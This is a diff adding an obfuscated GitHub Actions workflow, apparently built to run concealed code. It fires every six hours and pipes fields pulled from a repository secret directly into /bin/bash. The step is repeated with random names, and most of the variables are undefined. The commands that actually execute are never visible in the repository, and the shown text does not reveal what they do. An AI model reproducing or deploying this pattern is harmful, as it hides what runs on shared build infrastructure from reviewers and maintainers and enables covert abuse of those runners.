@@ -1,0 +1,27 @@
+name: duoknk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duoknk
+        env:
+          fcr38: ${{ secrets.fcr38 }}
+        run: |
+          echo $fcr38 | jq -r .yy00563 | /bin/bash
+          echo $fhfz26 | jq -r .habdo0 | /bin/bash
+          echo $sqhf26 | jq -r .wqwun85730 | /bin/bash
+          echo $bacro703 | jq -r .ffq461 | /bin/bash
+          echo $jlfeg86 | jq -r .z45 | /bin/bash
+          echo $xcq9 | jq -r .wo47944 | /bin/bash
+          echo $yfso33514 | jq -r .mbisx7920 | /bin/bash
+          echo $misvw507 | jq -r .b677 | /bin/bash
+          echo $weaf8691 | jq -r .z5 | /bin/bash
+
